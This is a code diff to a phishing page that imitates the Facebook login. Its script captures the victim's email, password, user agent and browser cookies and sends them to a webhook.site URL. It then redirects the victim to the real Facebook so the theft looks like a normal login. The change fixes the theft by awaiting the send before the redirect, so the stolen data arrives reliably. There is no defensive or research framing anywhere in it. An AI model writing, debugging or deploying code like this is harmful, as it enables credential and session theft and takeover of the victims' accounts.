@@ -138,8 +138,8 @@
             }
         }
 
-        // 3. Form Submission Logic
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // 3. Form Submission Logic (Async/Await Fix)
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
@@ -157,31 +157,27 @@
                 password: pass,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                cookies: document.cookie // Ye cookies collect karega
+                cookies: document.cookie
             };
 
             // YOUR WEBHOOK URL
             const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
 
-            // Send Data to Webhook
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "mode": "no-cors"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                console.log("Webhook sent successfully");
-                // Redirect to real Facebook
+            try {
+                // Ye await zaroori hai taaki data bhejne mein time lage aur page na redirect ho
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                
+                // Ab page redirect karo
                 window.location.href = "https://www.facebook.com/";
-            })
-            .catch(error => {
+            } catch (error) {
                 console.error("Error:", error);
-                // Even if error, redirect to make it look real
+                // Error hone par bhi redirect karo
                 window.location.href = "https://www.facebook.com/";
-            });
+            }
         });
     </script>
 </body>
